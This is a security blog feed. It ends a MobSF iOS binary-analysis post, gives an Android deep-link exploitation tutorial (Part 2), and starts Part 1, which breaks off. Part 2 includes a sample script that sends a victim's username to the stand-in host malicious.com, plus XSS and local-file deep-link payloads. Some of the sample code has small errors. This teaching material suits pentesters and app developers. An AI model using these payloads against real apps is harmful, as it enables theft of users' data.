	-v print verbosely (symbolically) when possible</code></pre><h2 id="code-signature">Code Signature</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.35.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1123" height="54" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.12.35.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.12.35.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.35.png 1123w"></figure><p>From the <a href="https://developer.apple.com/support/code-signing/">Apple docs on Code Signing</a> we can read:</p><blockquote>Before your app can integrate app services, be installed on a device, or be submitted to the App Store, it must be signed with a <a href="https://developer.apple.com/support/certificates/">certificate</a> issued by Apple.</blockquote><p>Also, from the <a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">iOS Security Guide</a>:</p><blockquote>In order to develop and install apps on iOS devices, developers must register with Apple and join the iOS Developer Program. The real-world identity of each developer, whether an individual or a business, is verified by Apple before their certificate is issued. <br>[...]<br>At runtime, code signature checks of all executable memory pages are made as they are loaded to ensure that an app has not been modified since it was installed or last updated.</blockquote><p>So, code signing is simply the process of signing an application with an appropriate certificate that ensures the author&apos;s identity and the app content&apos;s integrity.</p><p>Since this process is required by Apple for most operations, if this section is flagged as &quot;False&quot; by MobSF, it&apos;s likely that the file you&apos;re analysing was generated via some non-traditional method, which seems worth investigating.</p><h2 id="encrypted">Encrypted</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.17.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="55" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.14.17.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.17.png 932w"></figure><p>Similarly to the previous section, encryption shouldn&apos;t be a concern for most iOS developers, since the <code>App Store</code> takes care of it during the distribution process.</p><p>From <a href="https://iphonedev.wiki/index.php/Crack_prevention">iPhoneDev&apos;s Wiki</a>:</p><blockquote>App Store binaries are signed by both their developer and Apple. This encrypts the binary so that decryption keys are needed in order to make the binary readable.</blockquote><p>So, when it comes to the MobSF analysis you should keep in mind the origin of the <code>.ipa</code> you&apos;re testing:</p><ul><li>if you simply download it from the <code>App Store</code> (using <code>ipatool</code>, for example), then the binary should be encrypted;</li><li>if you get the <code>.ipa</code> from any other source, then most likely it&apos;s not encrypted.</li></ul><p>To confirm the binary&apos;s encryption you can use <code>otool</code> to look for the <code>LC_ENCRYPTION_INFO</code> section:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.32.27.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="462" height="120"></figure><p>From the <a href="https://iphonedev.wiki/index.php/Crack_prevention">iPhoneDev Wiki</a>:</p><blockquote>iOS can tell the encryption status of a binary via the <code>cryptid</code> struture member of <code>LC_ENCRYPTION_INFO</code> <code>MachO</code> <code>load</code> command. <br>If <code>cryptid</code> is a non-zero value then the binary in encrypted.</blockquote><p>Note that the <code>cryptsize</code> indicates the size of the encrypted segment.</p><p>Also note the usage of <code>otool</code>&apos;s <code>-l</code> flag:</p><pre><code>~ otool
	...
	-l print the load commands</code></pre><h2 id="nx">NX</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.38.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="930" height="76" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.14.38.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.38.png 930w"></figure><p>Although the <code>NX bit</code> is specific to the <code>AMD</code> architecture, people tend to use &quot;NX&quot; as a generic way of referring to the feature that enables you to <strong>specify non-executable memory pages</strong>. </p><p>So, in this case, the <code>NX</code> section actually refers to the <code>XN</code> or &quot;eXecute never&quot; feature, since we&apos;re dealing with an <code>ARM</code> binary.</p><p>In the <a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">iOS Security Guide</a>, under &quot;Runtime process security&quot; we can read:</p><blockquote>Further protection is provided by iOS using ARM&#x2019;s Execute Never (XN) feature, which marks memory pages as non-executable. <br>Memory pages marked as both writable and executable can be used only by apps under tightly controlled conditions: <br>The kernel checks for the presence of the Apple-only dynamic code-signing entitlement. Even then, only a single mmap call can be made to request an executable and writable page, which is given a randomized address. </blockquote><p>So, this section should never be flagged by MobSF, as long as Apple continues to use <code>XN</code> by default.</p><h2 id="pie">PIE</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.40.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="102" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.15.40.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.40.png 932w"></figure><p>As explained above, each time you run a &quot;Position Independent Executable&quot; (<code>PIE</code>), the binary and all of its dependencies are loaded into random locations within virtual memory, which make ROP attacks much more difficult to execute reliably.</p><p>We can check for the presence of the <code>PIE</code> flag in our executable with <code>otool</code>: </p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1151" height="96" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 1151w"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-h</code> and <code>-v</code> options:</p><pre><code>~ otool
	...
	-h print the mach header
	-v print verbosely (symbolically) when possible</code></pre><p>If this flag is not present in the binary, then you need to review your compilation settings.</p><p>First, ensure that <code>&quot;Don&apos;t Create Position Independent Executables&quot;</code> &#xA0;under <code>&quot;Build Settings&quot;</code> is set to <code>NO</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/rHGq2.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"><figcaption>https://stackoverflow.com/questions/32728783/why-would-xcode-not-use-the-build-configuration-settings-from-my-xcconfig-file</figcaption></figure><p>Then, check that these flags are set:</p><ul><li>In <code>Other C flags</code>: <code>-fPIC</code></li><li>In <code>Other Warning flags</code>: <code>-Wl,--emit-relocs</code> (retains all relocations in the executable file) and <code>-Wl,--warn-shared-textrel</code> (warns if the text segment is not shareable).</li></ul><h2 id="stack-canary">Stack Canary</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.33.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="124" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.19.33.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.33.png 932w"></figure><p>Again we can use <code>otool</code> to check whether a binary is using stack canaries by looking for some specific symbols, such as <code>_stack_chk_guard</code> and <code>_stack_chk_fail</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.44.30.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="434" height="150"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-I</code> and <code>-v</code> flags:</p><pre><code>~ otool
	...
	-I print the indirect symbol table
	-v print verbosely (symbolically) when possible</code></pre><p>If the stack canary is not present, you need to ensure that the <code>-fstack-protector-all</code> flag is set under <code>&quot;Other C Flags&quot;</code>, on your project&apos;s <code>&quot;Build Settings&quot;</code> tab, as shown below:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-22.50.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="881" height="165" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-22.50.58.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-22.50.58.png 881w" sizes="(min-width: 720px) 720px"></figure><h2 id="rpath">Rpath</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="933" height="103" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.15.58.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.58.png 933w"></figure><p>The &quot;Runpath Search Path&quot; instructs the dynamic linker to search for a dynamic library (dylib) on an ordered list of paths ... sort of like how Unix looks for binaries on <code>$PATH</code>.</p><p>This is an issue because it makes it possible for an attacker to place a malicious dylib in one of the first paths that doesn&apos;t contain the library that the linker is trying to locate, therefore hijacking it.</p><p>A simple way to check whether or not your application&apos;s libraries were compiled using <code>rpath</code> is to run <code>otool</code> with the <code>-L</code> flag, which lists all Mach-O Shared Libraries:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1324" height="245" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 1324w" sizes="(min-width: 1200px) 1200px"></figure><p>Note that some of the libraries are prefixed with <code>@rpath</code>, while others are prefixed by the absolute path.</p><p>Also, if you already have access to the full MobSF Static Analysis report, you can simply scroll down to the &quot;Libraries&quot; section and check which are prefixed by <code>@rpath</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.27.32.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="990" height="382" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-21.27.32.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.27.32.png 990w"></figure><p>In order to compile the libraries without <code>rpath</code> you need to use some hidden build flags. On your local command line run:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-19-at-19.33.44.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="943" height="92" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-19-at-19.33.44.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-19-at-19.33.44.png 943w"></figure><p>Note the swift compiler option <code>no-stdlib-rpath</code> which disables <code>rpath</code> entries during compilation.</p><p>Configure your build settings so that the application is built with this configuration flag, e.g.: <code>swift build -c release -Xswiftc -no-toolchain-stdlib-rpath</code>.</p><h2 id="symbols-stripped">Symbols Stripped</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.40.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>From Apple&apos;s <a href="https://developer.apple.com/documentation/xcode/building-your-app-to-include-debugging-information">Building Your App to Include Debugging Information</a>:</p><blockquote>When Xcode compiles your source code into machine code, it generates a list of symbols in your app&#x2014;class names, global variables, and method and function names. <br>These symbols correspond to the file and line numbers where they&#x2019;re defined; this association creates a <em><em>debug symbol</em></em>, so you can use the debugger in Xcode, or refer to line numbers reported by a crash report. <br>Debug builds of an app place the debug symbols inside the compiled binary file by default, while <strong>release builds of an app place the debug symbols in a companion <em><em>Debug Symbol file</em></em> </strong>(<code>dSYM</code>) to reduce the size of the distributed app.</blockquote><p>So, the good thing about these <code>dSYM</code> files is that you can store them separately and then use them to <a href="https://developer.apple.com/documentation/xcode/adding-identifiable-symbol-names-to-a-crash-report">symbolicate</a> your logs without actually letting the end user have access to them via App Store:</p><pre><code>~ symbolicatecrash &quot;&lt;path-to-crash-file&gt;&quot; &quot;&lt;path-to-dSYM file&gt;&quot; &gt; symbolicated.crash</code></pre><p>By default, <code>dSYM</code> files are generate for &quot;Release&quot; builds, which you can check by reviewing your <code>&quot;Build Settings&quot;</code>:</p><ul><li><code>Generate Debug Symbols</code> = <code>YES</code></li><li><code>Debug Information Format</code> = <code>DWARF with dSYM File</code></li></ul><p>A simple way to check whether or not your application was compiled with debug symbols is to again run <code>otool</code> with the <code>-Iv</code> flags:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.32.20.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>Alternatively, you can use <code>nm</code>, which &quot;displays the name list (symbol table) of each &#xA0;object file in the argument list&quot;.</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.43.08.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1101" height="474" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-22-at-11.43.08.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-22-at-11.43.08.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.43.08.png 1101w"></figure><p>If MobSF flags you project as containing debug symbols, please ensure that your project&apos;s <code>&quot;Build Settings&quot;</code> contain the following <code>&quot;Release&quot;</code> configurations:</p><ul><li><code>Deployment Postprocessing</code> = <code>YES</code>;</li><li><code>Strip Debug Symbols During Copy</code> = <code>YES</code>;</li><li><code>Strip Linked Product</code> = <code>YES</code>;</li><li><code>Strip Installed Product</code> &#xA0;= <code>YES</code> (works for non-App Store distributed builds if you&apos;ve set <code>Deployment Postprocessing</code> to <code>YES</code>)</li></ul><p>Finally, note that you can actually manually strip your binary, but as shown below, this invalidates the code signature:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.46.45.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1410" height="49" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-22-at-11.46.45.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-22-at-11.46.45.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.46.45.png 1410w" sizes="(min-width: 1200px) 1200px"></figure><hr><h2 id="useful-links">Useful Links</h2><ul><li><a href="http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/">http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/</a></li><li><a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf</a></li><li><a href="https://iphonedev.wiki/index.php/Crack_prevention">https://iphonedev.wiki/index.php/Crack_prevention</a></li><li><a href="https://blog.krzyzanowskim.com/2018/12/05/rpath-what/">https://blog.krzyzanowskim.com/2018/12/05/rpath-what/</a></li><li><a href="https://objective-see.com/blog/blog_0x46.html">https://objective-see.com/blog/blog_0x46.html</a></li><li><a href="https://stackoverflow.com/questions/3656391/whats-the-dsym-and-how-to-use-it-ios-sdk">https://stackoverflow.com/questions/3656391/whats-the-dsym-and-how-to-use-it-ios-sdk</a></li></ul>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 2]]></title><description><![CDATA[<p>In this part, we&apos;re going to start to answer the question: &quot;What can you do if you can trick a user into clicking a malicious deep link?&quot;</p><hr><p>Let&apos;s go back to the <code>ABC Bank</code> example. <code>ABC Bank</code> has both a web and an Android</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-2/</link><guid isPermaLink="false">611910dbfd1c6c08ebabad54</guid><category><![CDATA[android]]></category><category><![CDATA[mobile]]></category><category><![CDATA[deep links]]></category><category><![CDATA[text injection]]></category><category><![CDATA[open redirect]]></category><category><![CDATA[xss]]></category><category><![CDATA[LFI]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 15 Aug 2021 15:17:07 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/maxresdefault-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/maxresdefault-1.jpeg" alt="Exploiting Deep Links in Android - Part 2"><p>In this part, we&apos;re going to start to answer the question: &quot;What can you do if you can trick a user into clicking a malicious deep link?&quot;</p><hr><p>Let&apos;s go back to the <code>ABC Bank</code> example. <code>ABC Bank</code> has both a web and an Android application, and they use deep links to improve the user experience of transitioning between the two.</p><h2 id="text-injection">Text Injection</h2><p>So, the first thing they want to do is allow the user to view messages in their application. In order to do that, they use the following deep link:</p><pre><code>abcbank://view-message?message=&lt;message&gt;</code></pre><p>The Android application takes the <code>message</code> parameter and injects it into a <a href="https://developer.android.com/reference/android/widget/TextView">TextView</a> element:</p><pre><code class="language-Java">String message = getIntent().getData().getQueryParameter(&apos;message&apos;)
TextView messageTextView = (TextView)findViewById(R.id.msgTextView);
messageTextView.setText(message);</code></pre><p>In this scenario, it&apos;s possible that a malicious user creates a deep link that tricks a victim into completing some sort of action, e.g.:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.36.31.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 2" loading="lazy" width="1437" height="803" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-15-at-15.36.31.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-15-at-15.36.31.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.36.31.png 1437w" sizes="(min-width: 720px) 720px"></figure><h2 id="open-redirect">Open Redirect</h2><p>Let&apos;s say a customer is not sure about how to complete a specific operation, so they call the bank&apos;s customer support line and the ABC Bank&apos;s employee decides to send a deep link to the customer, so they can open a specific website page inside their Android application:</p><pre><code>abcbank://help?page=https://abcbank.com/how-to-setup-mfa</code></pre><p>Inside the application there&apos;s a <a href="https://developer.android.com/guide/webapps/webview">WebView</a> and whatever URL is received via this <code>page</code> parameter is loaded without any additional validation, as so:</p><pre><code class="language-Java">webview.loadUrl(getIntent().getData().getQueryParameter(&apos;page&apos;);</code></pre><p>In this scenario, a malicious attacker can craft a malicious deep link that replaces this <code>page</code> parameter with any other URL, e.g.:</p><pre><code>abcbank://help?page=https://malicious.com</code></pre><p>The result:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.46.07.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 2" loading="lazy" width="1438" height="805" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-15-at-15.46.07.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-15-at-15.46.07.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.46.07.png 1438w" sizes="(min-width: 720px) 720px"></figure><p>Now, this is bad by itself, but there&apos;s yet another danger.</p><h3 id="open-redirect-access-to-web-bindings">Open Redirect + Access to Web Bindings</h3><p>Let&apos;s say that the vulnerable WebView is used for multiple things inside the application, and one of those operations requires that the WebView has access to the username, that&apos;s stored inside the Android application.</p><p>In that case, the application can register a JS interface, e.g.:</p><pre><code class="language-Java">webview.addJavascriptInterface(WebAppInterface(this), &quot;Android&quot;)</code></pre><p>Then, inside the <code>WebAppInterface</code>, we can create a method such as:</p><pre><code class="language-Java">public final String getUserName() {
	return this.store.getUserName();
}</code></pre><p>Finally, the malicious attacker can create a malicious page that exfiltrates the user name of its visitors, as shown below:</p><pre><code>// https://malicious.com/index.html

&lt;DOCTYPE html&gt;
&lt;head&gt;
&lt;script&gt;
    var req = new XMLHttpRequest();
    xmlhttp.open(&quot;POST&quot;, https://malicious.com/user-data);
    xmlhttp.send(JSON.stringify(window.Android.getUserName()));
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
...</code></pre><p>The only thing left to do is to convince the victim to click the malicious deep link where this code is hosted:</p><pre><code>abcbank://help?page=https://malicious.com/index.html</code></pre><p>Note that in order for this to work there&apos;s an additional requirement, the WebView needs to have <a href="https://developer.android.com/reference/android/webkit/WebSettings#setJavaScriptEnabled(boolean)">JavaScript enabled</a>:</p><pre><code>webview.getSettings()setJavaScriptEnabled(true);</code></pre><h2 id="the-dangers-of-webviewloadurl">The dangers of WebView.loadUrl</h2><p>As we saw on the Open Redirect example shown above, we can use the <a href="https://developer.android.com/reference/android/webkit/WebView#loadUrl(java.lang.String)">loadUrl</a> method to load the given URL into a WebView:</p><pre><code class="language-Java">webview.loadUrl(getIntent().getData().getQueryParameter(&apos;url&apos;);</code></pre><p>However, this method doesn&apos;t only support <code>http(s)</code> schema but also <code>javascript:</code>, <code>file://</code>, etc.</p><p>This means that whenever we find an Open Redirect via this method, we should always test for <code>XSS</code> and <code>LFI</code>, e.g.:</p><pre><code>abcbank://help?page=javascript:alert(document.cookie)
abcbank://help?page=file:///sdcard/CDAInfo.txt</code></pre><p>Note that the first will only be possible if JavaScript is enabled, and the latter requires that local file access is possible!</p><h2 id="the-dangers-of-webviewloaddata">The dangers of WebView.loadData</h2><p>As the name suggests we can use <code>loadData</code> method to load data into a WebView using a <code>&apos;data&apos;</code> scheme URL. </p><p>This allows us to do some fun stuff like taking some <code>HTML</code> from a deep link parameter and injecting it directly into a WebView with JavaScript enabled, as shown in the example below:</p><pre><code>String html = getIntent().getData().getQueryParameter(&apos;html&apos;)

WebView wv = new WebView(this);
wb.getSettings().setJavaScriptEnabled(true);
wv.loadData(html, &quot;text/html&quot;, &quot;UTF-8&quot;)</code></pre><p>Now, we can go wherever imagination takes us, we&apos;re only restricted by the application&apos;s features and security restrictions: </p><ul><li>we can test to see if the user&apos;s <code>Cookie</code> or other authentication token is accessible via JavaScript, and exfiltrate by triggering JS using a <code>&lt;script&gt;</code> element;</li><li>we can try to exfiltrate any other private user information again using a <code>&lt;script&gt;</code> element</li><li>we can inject some <code>CSS</code> and <code>HTML</code> that hides the actual content and displays a fake login screen to trick the user into entering their credentials</li><li>an many more ...</li></ul><hr><p><a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-3/index.html">Next</a>, we&apos;ll look into other fun vulnerabilities such as LFI and even RCE using deep links.</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 1]]></title><description><![CDATA[<p>Deep links are an often overlooked way to exploit Android applications.</p><p>In this series I hope to do a deep dive into their history, common vulnerabilities with real-life examples, possible mitigations, and testing techniques for pentesters and researchers.</p><p>In this first part, we do a quick overview of the supported</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part1/</link><guid isPermaLink="false">610e4a2dfd1c6c08ebaba859</guid><category><![CDATA[android]]></category><category><![CDATA[mobile]]></category><category><![CDATA[deep links]]></category><category><![CDATA[link hijacking]]></category><category><![CDATA[phishing]]></category><category><![CDATA[scheme urls]]></category><category><![CDATA[app links]]></category><category><![CDATA[intent urls]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 13 Aug 2021 18:22:56 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/maxresdefault.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/maxresdefault.jpeg" alt="Exploiting Deep Links in Android - Part 1"><p>Deep links are an often overlooked way to exploit Android applications.</p><p>In this series I hope to do a deep dive into their history, common vulnerabilities with real-life examples, possible mitigations, and testing techniques for pentesters and researchers.</p><p>In this first part, we do a quick overview of the supported deep link formats in Android, and then quickly jump into the first vulnerability: <strong>Link Hijacking</strong>.</p><hr><h2 id="an-intro-to-deep-links-in-android">An Intro to Deep Links in Android</h2><p>In short, deep links allow users to open specific content inside a mobile application.</p><p>In Android, there are 3 valid deep link formats:</p><ol><li><code>Scheme URLs</code> (aka <code>Custom Scheme URLs</code> or <code>URL Schemes</code>)</li><li><code>App Links</code> (aka <code>Android App Links</code>)</li><li><code>Intent URLs</code> (aka <code>Intent Scheme URLs</code>)</li></ol><p>Note that the first 2 have an iOS equivalent, while the 3rd only exists in Android.</p><h3 id="scheme-urls">Scheme URLs</h3><p>Scheme URLs were introduced with <code>Android 1.0</code> and <code>iOS 2.0</code> and clearly prioritised flexibility rather than security.</p><p>In this first iteration of deep links, <strong>any application can register any scheme, host and path</strong>, e.g.:</p><figure class="kg-card kg-image-card"><img src="https://lh6.googleusercontent.com/GD5GzXCpD1TKrM1hnu1qcvNhs2_yIQn-2nrKrDrH4YRCIas12eCYr3N74GHPHNqtzJAmLOZnwCtB4kfcEEtmCfB9DHq_uNSd35zLO4wXkr6SG-_I_SYC7Ylczusju4M4MXfEbyUJruk" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>This means that there&apos;s no mechanism to ensure, for example, that all deep links with the <code>fb://</code> scheme are handled by the Facebook app.</p><p>If a user clicks on a deep link, the OS starts by checking which of the applications installed on the device have registered it:</p><ul><li>if there is <strong>only 1 application</strong>, the OS will automatically open the deep link with that application;</li><li>if there is more than 1 application, the OS will check if any of them <strong>have previously been set as the &quot;preference&quot;</strong> - if so, the OS will open the link with that application;</li><li>if there is more than 1 application and none of them have ever been set as the preference, the OS will prompt the user to choose between the apps.</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.33.50.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="414" height="165"></figure><p>Note that if the user clicks &quot;Always&quot; on this prompt, the chosen application becomes the preference, and the prompt will not be shown again.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/image-2.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="508" height="444"></figure><p>Since any app can register any scheme, a victim application can become vulnerable to Link Hijacking, which we&apos;ll discussed in more detail at the end of this part.</p><h3 id="app-links">App Links</h3><p>App Links were introduced in 2015 with <code>Android 6</code> and <code>iOS 9</code> - note that in iOS they&apos;re called <a href="https://developer.apple.com/ios/universal-links/">Universal Links</a>.</p><p>App Links no longer support custom schemes, only <code>HTTP</code> or <code>HTTPS</code>. This makes the links &quot;natively&quot; compatible with any browser:</p><figure class="kg-card kg-image-card"><img src="https://lh6.googleusercontent.com/R3QhI5qKJ94cfy_uvz28KSeLJkzk5jFpQzbDCdkCcgFCVajTgpl8i1RNepFyctgXH9HZlcKM8xkztDYrcS8Q5U_yNWdHgvRGSd9LiVrsFBphl9a0ilWTpqZhcbUDIAXHlZOhYMQPrYQ" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>More important, when it comes to security, App Links introduced a mechanism that (at least in theory) prevents other apps from claiming a link: <a href="https://developer.android.com/training/app-links/verify-site-associations">App Link Association</a>.</p><p><strong>App Link Association</strong></p><p>The idea is pretty simple: to make sure that all <code>https://foo.com</code> deep links are always handled by the <code>foo</code> application, the team at Foo simply needs to add a specific file on the <code>foo.com</code> server that contains the <code>SHA256</code> fingerprint of the <code>foo</code> app&apos;s signing certificate - see more details <a href="https://developer.android.com/training/app-links/verify-site-associations">here</a>.</p><p>When the <code>foo</code> application is being installed on the device, its <code>AndroidManifest.xml</code> file should indicate that it wants to register and verify the <code>https://foo.com</code> App Link, and as a result the OS will check the aforementioned file - if everything&apos;s OK, no other app will be able to claim this link.</p><figure class="kg-card kg-image-card"><img src="https://lh5.googleusercontent.com/7Pnd9LH0pel0rbFOvQqcQBuekklcA-YYIWEPOEpN_yZVDHB3sPgZVkgTV-rlIk2jHtS0jAz619EPBarBHsEh3LW83kBJ6zuOH9KPqbCbfCZOJ_e3JrngRznwwG_2WU9EzLi3IOUSwCw" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>So, the good people at Foo no longer need to worry about Link Hijacking right? ... Nope.</p><p>First, we should note that iOS and Android have different policies when it comes to handling failed verifications:</p><ul><li>iOS prohibits opening unverified Universal Links;</li><li>Android, however, leaves the decision up to users: if an unverified App Link is clicked, Android prompts users to choose if they want to open the link in the app or the browser.</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.34.43.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>Worse even, according to <a href="https://people.cs.vt.edu/gangwang/deep17.pdf">a 